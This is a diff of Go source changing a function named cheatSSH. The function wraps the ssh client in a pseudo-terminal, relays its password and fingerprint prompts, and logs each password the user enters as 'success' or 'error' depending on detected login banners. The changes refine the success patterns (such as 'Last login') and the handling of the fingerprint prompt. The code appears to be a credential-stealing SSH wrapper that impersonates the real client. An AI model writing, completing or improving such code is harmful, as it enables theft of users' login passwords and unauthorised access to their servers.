@@ -10,13 +10,13 @@ import (
 	"regexp"
 	"strings"
 	"syscall"
+	"time"
 )
 
-var SSHFirstTime = regexp.MustCompile(`\[fingerprint\]`)
 var SSHIgnore = regexp.MustCompile("not a terminal")
 var SSHAsk = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(错误)`)
 var SSHAskEnd = regexp.MustCompile(`(: $)|(：$)`)
-var SSHSuccess = regexp.MustCompile(`Welcome to`)
+var SSHSuccess = regexp.MustCompile(`(Welcome to)|(Last login)|(Last failed login)`)
 var SSHIfFirst = regexp.MustCompile(`^(The authenticity)`)
 
 func cheatSSH() string {
@@ -47,11 +47,11 @@ func cheatSSH() string {
 	}()
 	var lineByte []byte
 	var line string
+	var FirstTime bool
 	go func() {
 		for {
 			v, err := pty.ReadByte()
 			if err != nil || v == 0 {
-				//fmt.Println("out2")
 				readLock <- struct{}{}
 				return
 			}
@@ -60,44 +60,47 @@ func cheatSSH() string {
 			line = string(lineByte)
 			//fmt.Println(line,line[len(line)-1])
 
-			if SSHIfFirst.MatchString(line) {
-				AskPass = true
-			}
-			if AskPass && SSHFirstTime.MatchString(line) && strings.HasSuffix(line, "?") {
-				fmt.Print(line)
-
+			//判断是否需要指纹交互
+			if FirstTime && strings.HasSuffix(line, "?") {
 				var input string
+				fmt.Print(line)
 				fmt.Scanln(&input)
-				pty.Master.WriteString(input + "\r")
+				pty.Master.WriteString(input + "\r\n")
 				line = ""
 				lineByte = nil
+				FirstTime = false
+				continue
 			}
 
-			//逐行输出
 			if v == 13 || v == 10 {
-				if !AskPass && !SSHAsk.MatchString(line) && !SSHFirstTime.MatchString(line) && strings.TrimSpace(line) != "" {
-					//fmt.Println("out")
+				//根据第一行判断是否为指纹识别模式
+				if SSHIfFirst.MatchString(line) {
+					AskPass = true
+					FirstTime = true
+				}
+				//若不是指纹识别模式和密码模式
+				if !FirstTime && !AskPass && !SSHAsk.MatchString(line) && strings.TrimSpace(line) != "" {
 					readLock <- struct{}{}
 					return
 				}
-
-				//判断密码是否正确
 				if password != "" && strings.TrimSpace(line) != "" {
-					if failAuthRE.MatchString(line) {
-						writePassword(password + " error")
-						password = ""
-					} else {
-						//fmt.Print(line)
+					if SSHSuccess.MatchString(line) {
 						writePassword(password + " success")
 						c.Process.Kill()
 						readLock <- struct{}{}
 						return
+					} else {
+						writePassword(password + " error")
+						password = ""
 					}
 				}
+				//AskPass = true
 				fmt.Print(line)
 				lineByte = nil
 				line = ""
+				continue
 			}
+
 			//询问密码语句输出
 			if line != "" && SSHAsk.MatchString(line) && SSHAskEnd.MatchString(line) {
 				AskPass = true
@@ -106,11 +109,12 @@ func cheatSSH() string {
 				line = ""
 				writeMsg <- struct{}{}
 				//去除输入的换行符
-				pty.ReadByte()
+				//pty.ReadByte()
 			}
 		}
 	}()
 	c.Wait()
+	time.Sleep(time.Second / 2)
 	pty.Close()
 	<-readLock
 
